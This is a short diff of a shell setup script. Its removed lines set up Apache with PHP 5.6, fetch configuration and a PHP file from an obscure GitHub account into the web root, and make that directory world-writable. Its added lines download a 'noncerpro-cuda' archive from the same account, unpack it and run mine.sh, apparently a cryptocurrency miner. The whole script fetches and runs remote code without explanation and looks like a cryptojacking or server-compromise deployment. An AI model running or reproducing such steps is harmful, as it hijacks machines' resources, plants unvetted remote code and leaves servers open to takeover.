@@ -1,25 +1,5 @@
-apt-get install apache2
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/noncerpro-cuda-linux-3.3.1.tar.gz
 
-cd /etc/apache2/
+tar -xvf ./noncerpro-cuda-linux-3.3.1.tar.gz
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
-
-cd /etc/apache2/sites-enabled/
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
-
-apt-get install -y software-properties-common
-
-add-apt-repository ppa:ondrej/php -y
-
-apt-get install -y php5.6
-
-service apache2 restart
-
-cd /var/www/html/
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474.php
-
-rm -rf /var/www/html/index.html
-
-chmod 777 -R /var/www/html/
+./mine.sh
